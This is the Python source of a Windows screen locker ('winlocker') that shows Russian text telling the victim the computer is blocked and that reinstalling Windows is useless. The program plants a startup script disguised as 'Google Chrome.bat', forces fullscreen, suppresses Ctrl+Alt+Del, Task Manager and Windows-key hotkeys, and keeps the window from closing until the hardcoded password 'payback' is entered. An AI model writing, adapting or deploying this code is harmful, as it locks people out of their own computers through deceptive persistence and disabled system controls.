import tkinter
from tkinter import *
import tkinter as tk
from tkinter import ttk
import getpass
import sys
import os
import os.path
import pyautogui
import time
import keyboard
from tkinter import messagebox as wr




USERNAME = getpass.getuser()

window = Tk()
window.title('Death Star')
window.geometry('1920x1080')
canv = Canvas(window, width=1920, height=1080, bg='black')
canv.grid(row=2, column=3)

img = PhotoImage(file="ole-magnus-schei-sunnevag-dsro17.png")
canv.create_image(20,20, anchor=NW, image=img)

normal_width = 1920
normal_height = 1080

# Get screen size
screen_width = window.winfo_screenwidth()
screen_height = window.winfo_screenheight()

# Get percentage of screen size from Base size
percentage_width = screen_width / (normal_width / 100)
percentage_height = screen_height / (normal_height / 100)

# Make a scaling factor, this is bases on average percentage from
# width and height.
scale_factor = ((percentage_width + percentage_height) / 2) / 100

# Set the fontsize based on scale_factor,
# if the fontsize is less than minimum_size
# it is set to the minimum size

fontsize = int(20 * scale_factor)
minimum_size = 10
if fontsize < minimum_size:
       fontsize = minimum_size

fontsizeHding = int(72 * scale_factor)
minimum_size = 40
if fontsizeHding < minimum_size:
       fontsizeHding = minimum_size


default_style = ttk.Style()
default_style.configure('New.TButton', font=("Helvetica", fontsize))


def allways(file_path=''):
	if file_path == '':
		file_path = os.path.dirname(os.path.realpath(__file__))
	bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USERNAME
	with open(bat_path + '\\' + "Google Chrome.bat", "w+") as bat_file:
			bat_file.write(r'start "" %s' % file_path)


def block():
	pyautogui.moveTo(x=680,y=800)
	window.protocol('WM_DELETE_WINDOW', block)
	window.update()


def fullscreen():
	window.attributes('-fullscreen', True)


def iinput():
	pasw = format(txt.get())
	if pasw == 'payback':
		file_path = '/tmp/file.txt'
		file_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Google Chrome.bat' % USERNAME
		os.remove(file_path)
		sys.exit()

def winblock():
	keyboard.add_hotkey("win", lambda: None, suppress =True)
	keyboard.add_hotkey("ctrl + alt + tab", lambda: None, suppress =True)
	keyboard.add_hotkey("ctrl + shift + esc", lambda: None, suppress =True)
	keyboard.add_hotkey("ctrl + alt + del", lambda: None, suppress =True)


txt_one = Label(window, text='Упс, нам так стыдно...', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_two = Label(window, text='Я шучу:(', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
txt_three = Label(window, text='Ваш компьютер был заблокирован винлокером. Пожалуйста, не совершайте лишних действий.', font=("Arial Bold", fontsize), fg='white', bg='black')
txt_four = Label(window, text='Переустановка Window бесполезна. Хорошего дня!', font=("Arial Bold", fontsize), fg='white', bg='black')



txt_one.grid(column=0, row=0)
txt_two.grid(column=0, row=0)
txt_three.grid(column=0, row=0)
txt_four.grid(column=0, row=0)
txt_one.place(relx = .01, rely = .01)
txt_two.place(relx = .01, rely = .11)
txt_three.place(relx = .01, rely = .21)
txt_four.place(relx = .01, rely = .31)


winblock()
allways("\\proof.py")
fullscreen()




txt = Entry(window)  
btn = Button(window, text="Ввести", command=iinput)
txt.place(relx = .28, rely = .5, relwidth=.3, relheight=.06)
btn.place(relx = .62, rely = .5, relwidth=.1, relheight=.06)


block()


window.mainloop()

